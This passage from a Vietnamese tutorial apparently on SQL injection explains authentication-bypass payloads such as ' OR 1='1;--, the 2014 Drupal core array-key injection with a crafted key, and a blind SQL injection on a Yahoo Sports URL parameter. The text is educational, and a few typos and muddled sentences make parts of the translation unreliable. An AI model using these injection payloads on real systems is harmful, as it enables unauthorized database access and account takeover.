&lt;li&gt;Query này tìm kiếm tất cả các bản ghi có tên là &lt;code&gt;1=&#39;1&lt;/code&gt; và mật khẩu là 12345 (ví dụ ở đây là CSDL được lưu password ở dạng rõ, chưa băm hay mã hóa). Vì kiểm tra password sử dụng toán tử &lt;code&gt;AND&lt;/code&gt;, truy vấn này của chúng tôi đã lấy được dữ liệu trả về với name và mật khẩu là 12345. Nhưng bây giờ chúng ta có 1 kiểu tấn công khác, bằng cách thêm &lt;code&gt;;--&lt;/code&gt;, kiểm tra &lt;code&gt;&#39;OR 1=&#39;1;--&lt;/code&gt;. Kiểu Injection này thực hiện được 2 điều: dấu chấm phẩy &lt;code&gt;;&lt;/code&gt; kết thúc câu lệnh SQL và dấu &lt;code&gt;--&lt;/code&gt; cho phép comment lại tất cả câu lệnh ở phía sau nó. Có nghĩa là:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;test&amp;#39; OR 1=&amp;#39;1&amp;#39; AND pw = &amp;#39;12345&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;Sau khi chỉnh sửa một chút thì sẽ thành
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;test&amp;#39; OR 1=&amp;#39;1&amp;#39;;-- AND pw = &amp;#39;12345&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;Vậy câu lệnh SQL mà &lt;code&gt;$q&lt;/code&gt; gửi lên được thực thi sẽ chỉ còn
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE name = &amp;#39;test&amp;#39; OR 1=&amp;#39;1&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;Câu lệnh này sẽ giúp ta lấy được tất cả bản ghi của bảng users.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;examples&#34;&gt;Examples&lt;/h2&gt;
&lt;h3 id=&#34;1-drupal-sql-injection&#34;&gt;1. Drupal SQL Injection&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Drupal là một hệ thống quản lý nội dung phổ biến được sử dụng để xây dựng trang web, rất giống với Wordpress và Joomla. Nó được viết bằng PHP và dựa trên mô-đun. Cộng đồng Drupal khá mạnh và cung cấp miễn phí. Bao gồm thương mại điện tử, tích hợp bên thứ ba, sản xuất nội dung,&amp;hellip; Tuy nhiên, mọi cài đặt Drupal đều chứa ucnfg một bộ mô-đu lõi được sử dụng để chạy nền tảng và yêu cầu kết nối với CSDL. Chúng còn được gọi là lõi Drupal. Vào năm 2014, nhóm Drupal Security đã phát hành bản cập nhật lõi Drupal cho thấy tất cả các trang chạy Drupal đều bị tấn công SQL bởi người dùng ẩn danh. Tác động của lỗ hổng cho phép kẻ tấn công chiếm được bất kỳ trang web Drupal nào. Cụ thể hơn, Drupal đã sử dụng Đối tượng dữ liệu PHP (PDO) làm giao diện để truy cập cơ sở dữ liệu. Các nhà phát triển lõi Drupal đã viết mã gọi các hàm PDO đó và mã Drupal sẽ được sử dụng bất cứ khi nào các nhà phát triển khác viết mã để tương tác với cơ sở dữ liệu Drupal. Đây là một thực tiễn phổ biến trong phát triển phần mềm. Lý do cho điều này là để cho phép Drupal được sử dụng với các loại cơ sở dữ liệu khác nhau (MySQL, Postgres, v.v.), loại bỏ sự phức tạp và cung cấp tiêu chuẩn hóa. Bây giờ, điều đó nói rằng, hóa ra, Stefan đã phát hiện ra rằng mã trình bao bọc Drupal đưa ra một giả định không chính xác về dữ liệu mảng được chuyển đến một truy vấn SQL. Đây là mã gốc:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$new_keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Bạn có thể phát hiện ra lỗi không (tôi sẽ có thể)? Các nhà phát triển đã đưa ra giả định rằng dữ liệu mảng sẽ luôn chứa các khóa số, như 0, 1, 2, v.v. (giá trị &lt;code&gt;$i&lt;/code&gt;) và do đó họ đã tham gia biến &lt;code&gt;$key&lt;/code&gt; thành &lt;code&gt;$i&lt;/code&gt; và làm cho giá trị đó bằng với giá trị. Đây là một truy vấn thông thường sẽ trông như thế nào từ hàm db_query của Drupal:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;db_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM {users} WHERE name IN (:name)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:name&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user1&amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Ở đây hàm db_query lấy một truy vấn CSDL &lt;code&gt;SELECT * FROM {users} where name IN (:name)&lt;/code&gt;và một mảng các giá trị để thay thế cho các phần giữ chỗ trong truy vấn. Trong PHP, khi bạn khai báo một mảng là mảng (&amp;lsquo;value&amp;rsquo;, &amp;lsquo;value2&amp;rsquo;, &amp;lsquo;value3&amp;rsquo;), nó thực sự tạo ra [0⇒ &amp;lsquo;value&amp;rsquo;, 1 ⇒ &amp;lsquo;value2&amp;rsquo;, 2 ⇒ &amp;lsquo;value3&amp;rsquo;] trong đó mỗi giá trị có thể truy cập bằng khóa số. Trong trường hợp này, biến tên: đã được thay thế bằng các giá trị trong mảng [0 ⇒ &amp;lsquo;user1&amp;rsquo;, 1⇒ &amp;lsquo;user2&amp;rsquo;]. Những gì bạn sẽ nhận được từ điều này là:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;userccs&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name_0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Vấn đề phát sinh tiếp sẽ như sau:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;db_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM {users} where name IN (:name)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:name&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test) -- &amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Trong trường hợp này , &lt;code&gt;:name&lt;/code&gt; là một mảng và các khóa của nó là &lt;code&gt;‘test) -&#39;,&#39;test&#39;&lt;/code&gt;. Khi Drupal nhận được điều này và xử lý mảng để tạo truy vấn, điều cần làm là:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name_test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- , :name_test)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Có thể rất khó để thấy được lý do tại sao lại như vậy, hãy thử. Dựa trên foreach, Drupal sẽ lần lượt đi qua từng phần tử trong mảng. Vì vậy, đối với tiêu chí &lt;code&gt;$i = test)-&lt;/code&gt; và &lt;code&gt;$value = user1&lt;/code&gt;. Bây giờ, &lt;code&gt;$key&lt;/code&gt; là &lt;code&gt;(:name)&lt;/code&gt; từ truy vấn và kết hợp với &lt;code&gt;$i&lt;/code&gt;, chúng ta nhận được &lt;code&gt;name_test)--&lt;/code&gt;. Bây giờ, với tất cả những gì đã có. Drupal đang đóng gói các đối tượng PDO của PHP đi lượn lờ =)), vì PDO cho phép nhiều query. Vì vậy, kẻ tấn công có thể vượt qua được mã độc, như truy vấn SQL thực tế để tạo người dùng quản trị cho khóa mảng, được giải thích và thực thi dưới dạng nhiều truy vấn.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-yahoo-sports-blind-sql&#34;&gt;2. Yahoo Sports Blind SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Theo blog của mình, Stefano đã tìm thấy lỗ hổng SQLi nhờ tham số năm trong &lt;code&gt;http://sports.yahoo.com/nfl/draft?year=2010&amp;amp;type=20&amp;amp;round=2&lt;/code&gt;. Từ bài đăng của anh ấy, đây là một ví dụ về phản hồi hợp lệ cho Url:
&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/4b7d56c0-3b17-490e-8bcb-1b947426c5ce.png&#34;&gt;&lt;/li&gt;
&lt;li&gt;Nào, bây giờ chúng ta thêm &lt;code&gt;--&lt;/code&gt; vào sau &lt;code&gt;year=2010&lt;/code&gt; ta được gì.
&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/54386b5c-a7cc-4288-9d30-0823dbd58012.png&#34;&gt;&lt;/li&gt;
&lt;li&gt;Lý do cho điều này là, &lt;code&gt;--&lt;/code&gt; đóng vai trò là comment trong truy vấn, như tôi đã nêu chi tiết ở trên. Vì vậy, nơi truy vấn ban đầu của Yahoo có thể trông giống như:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PLAYERS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;YEAR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2010&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ROUND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Sau khi thêm &lt;code&gt;--&lt;/code&gt; thì câu truy vấn sẽ trở thành
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PLAYERS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;YEAR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2010&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Nhận ra điều này, chúng ta có thể bắt đầu lấy thông tin CSDL từ Yahoo. Ví dụ: Stefano có thể kiểm tra số phiên bản chính của phần mềm CSDL bằng cách sau:
&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/0894ac3b-14e9-4def-8608-b415e503e4ef.png&#34;&gt;&lt;/li&gt;
&lt;li&gt;Sử dụng hàm &lt;code&gt;IF&lt;/code&gt;, chúng ta sẽ được trả về nếu ký tự đầu tiên từ hàm version() là 5. Hàm &lt;code&gt;IF&lt;/code&gt; có một điều kiện là sẽ trả về giá trị sau nó nếu điều kiện là đúng và tham số cuối cùng nếu nó sai. Vì vậy, dựa theo hình trên, điều kiện là ký tự đầu tiên trong phiên bản. Do đó, chúng tôi biết phiên bản CSDL không phải là 5 vì không có kết quả nào được trả về. Lý do đây là được coi là một SQLi mù quáng là bởi vì Stefano có thể nhìn thấy kết quả trực tiếp, anh ấy có thể chỉ cần in ra phiên bản CSDL vì Yahoo chỉ trả lại người dùng. Tuy nhiên, bằng cách thao tác truy vấn và so sánh kết quả với kết quả đầu tiên, anh ta đã có thể tiếp tục trích xuất thông tin từ CSDL của Yahoo.&lt;/li&gt;
